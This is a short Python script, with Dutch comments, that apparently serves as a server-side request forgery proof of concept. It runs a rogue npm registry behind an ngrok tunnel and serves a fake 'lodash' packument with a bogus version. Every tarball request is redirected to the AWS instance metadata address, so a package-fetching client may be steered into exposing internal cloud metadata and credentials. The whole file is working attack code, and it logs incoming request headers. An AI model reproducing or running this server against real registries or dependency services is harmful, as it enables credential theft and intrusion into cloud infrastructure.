import json
from http.server import HTTPServer, BaseHTTPRequestHandler

NGROK = "https://d511-84-30-51-191.ngrok-free.app"
INTERNAL = "http://169.254.169.254/latest/meta-data/"

PACKUMENT = json.dumps({
    "name": "lodash",
    "dist-tags": {"latest": "4.20.0"},
    "versions": {
        "4.20.0": {
            "name": "lodash",
            "version": "4.20.0",
            "dist": {
                "tarball": NGROK + "/lodash/-/lodash-4.20.0.tgz",
                "shasum": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
            }
        },
        "4.17.21": {
            "name": "lodash",
            "version": "4.17.21",
            "dist": {
                "tarball": NGROK + "/lodash/-/lodash-4.17.21.tgz",
                "shasum": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
            }
        }
    }
}).encode()

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        ua = self.headers.get("User-Agent", "")
        print(f"\n[REQUEST] {self.path}")
        print(f"  User-Agent: {ua}")
        for k, v in self.headers.items():
            if k.lower() != "user-agent":
                print(f"  {k}: {v}")

        # Tarball download request -> redirect naar IMDS
        if self.path.endswith(".tgz"):
            print(f"[!!!] TARBALL REQUEST -> redirect naar {INTERNAL}")
            self.send_response(301)
            self.send_header("Location", INTERNAL)
            self.end_headers()
            return

        # Packument request (npm of excon)
        if "npm/" in ua:
            print(f"[!] npm packument -> HTTPS tarball URLs serveren")
        else:
            print(f"[*] excon packument -> serveren")

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(PACKUMENT)))
        self.end_headers()
        self.wfile.write(PACKUMENT)

    def log_message(self, format, *args):
        pass

print("Server luistert op poort 9090...")
HTTPServer(("0.0.0.0", 9090), Handler).serve_forever()
